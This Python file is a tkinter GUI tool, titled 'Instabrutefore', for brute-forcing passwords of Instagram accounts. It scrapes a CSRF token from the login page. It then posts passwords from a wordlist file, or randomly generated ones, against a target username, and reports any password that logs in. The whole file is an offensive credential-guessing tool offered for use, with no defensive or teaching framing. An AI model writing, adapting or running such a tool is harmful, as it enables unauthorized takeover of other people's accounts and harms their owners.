import requests
import time
import re
import random
import string
import tkinter as tk
from tkinter import ttk

def generate_random_password(length, strength):
    if strength == 'weak':
        characters = string.ascii_letters
    elif strength == 'medium':
        characters = string.ascii_letters + string.digits
    else:  # strong
        characters = string.ascii_letters + string.digits + string.punctuation

    return ''.join(random.choice(characters) for _ in range(length))

def brute_force(username, password_source, dictionary=None, password_length=None, password_strength=None):
    login_url = 'https://www.instagram.com/accounts/login/'

    session = requests.Session()
    session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'

    try:
        response = session.get(login_url)
        csrf_token = re.search(r'"csrf_token":"(.*?)"', response.text).group(1)

        if password_source == 'dictionary':
            with open(f'{dictionary}.txt', 'r') as file:
                bruteforce = [line.strip() for line in file]

            for brute in bruteforce:
                login_data = {
                    'username': username,
                    'password': brute,
                    'csrfmiddlewaretoken': csrf_token
                }
                response = session.post(login_url, data=login_data, allow_redirects=False)
                time.sleep(1)  # Wait for the login attempt

                if 'location' in response.headers and response.headers['location'] == 'https://www.instagram.com/':
                    return f"Successful login - Username: {username}, Password: {brute}"
                else:
                    result_label.config(text=f"Unsuccessful login - Username: {username}, Password: {brute}")
                    root.update()

        elif password_source == 'random':
            for _ in range(5):  # You need to change this loop to match your intended behavior
                password = generate_random_password(password_length, password_strength)

                login_data = {
                    'username': username,
                    'password': password,
                    'csrfmiddlewaretoken': csrf_token
                }
                response = session.post(login_url, data=login_data, allow_redirects=False)
                time.sleep(1)  # Wait for the login attempt

                if 'location' in response.headers and response.headers['location'] == 'https://www.instagram.com/':
                    return f"Successful login - Username: {username}, Password: {password}"
                else:
                    result_label.config(text=f"Unsuccessful login - Username: {username}, Password: {password}")
                    root.update()

    except Exception as e:
        return f"An error occurred: {str(e)}"

def run_brute_force():
    username = username_entry.get()
    password_source = password_source_var.get()

    if password_source == 'dictionary':
        dictionary = dictionary_entry.get()
        result = brute_force(username, password_source, dictionary=dictionary)
    elif password_source == 'random':
        password_length = int(password_length_var.get())
        password_strength = password_strength_var.get()
        result = brute_force(username, password_source, password_length=password_length, password_strength=password_strength)

    result_label.config(text=result)

root = tk.Tk()
root.title("Instabrutefore")

# Create and layout widgets
username_label = tk.Label(root, text="Username:")
username_entry = tk.Entry(root)

password_source_var = tk.StringVar()
password_source_label = tk.Label(root, text="Password Source:")
password_source_combo = ttk.Combobox(root, textvariable=password_source_var, values=["dictionary", "random"])
password_source_combo.set("dictionary")
password_source_combo.bind("<<ComboboxSelected>>", lambda event: toggle_password_options())

dictionary_label = tk.Label(root, text="Dictionary:")
dictionary_entry = tk.Entry(root)

password_length_label = tk.Label(root, text="Password Length:")
password_length_var = tk.StringVar()
password_length_spinbox = tk.Spinbox(root, from_=1, to=100, textvariable=password_length_var)

password_strength_label = tk.Label(root, text="Password Strength:")
password_strength_var = tk.StringVar()
password_strength_combo = ttk.Combobox(root, textvariable=password_strength_var, values=["weak", "medium", "strong"])
password_strength_combo.set("weak")

run_button = tk.Button(root, text="Run Brute Force", command=run_brute_force)
result_label = tk.Label(root, text="", wraplength=300)

# Place widgets in the grid
username_label.grid(row=0, column=0, padx=10, pady=5, sticky="w")
username_entry.grid(row=0, column=1, padx=10, pady=5, columnspan=2)

password_source_label.grid(row=1, column=0, padx=10, pady=5, sticky="w")
password_source_combo.grid(row=1, column=1, padx=10, pady=5, columnspan=2)

dictionary_label.grid(row=2, column=0, padx=10, pady=5, sticky="w")
dictionary_entry.grid(row=2, column=1, padx=10, pady=5, columnspan=2)

password_length_label.grid(row=3, column=0, padx=10, pady=5, sticky="w")
password_length_spinbox.grid(row=3, column=1, padx=10, pady=5, columnspan=2)

password_strength_label.grid(row=4, column=0, padx=10, pady=5, sticky="w")
password_strength_combo.grid(row=4, column=1, padx=10, pady=5, columnspan=2)

run_button.grid(row=5, column=0, columnspan=3, padx=10, pady=10)
result_label.grid(row=6, column=0, columnspan=3, padx=10, pady=5)

# Toggle password options based on source selection
def toggle_password_options():
    password_source = password_source_var.get()
    if password_source == 'dictionary':
        dictionary_label.config(state='normal')
        dictionary_entry.config(state='normal')
        password_length_label.config(state='disabled')
        password_length_spinbox.config(state='disabled')
        password_strength_label.config(state='disabled')
        password_strength_combo.config(state='disabled')
    elif password_source == 'random':
        dictionary_label.config(state='disabled')
        dictionary_entry.config(state='disabled')
        password_length_label.config(state='normal')
        password_length_spinbox.config(state='normal')
        password_strength_label.config(state='normal')
        password_strength_combo.config(state='normal')

toggle_password_options()  # Set initial state

root.mainloop()
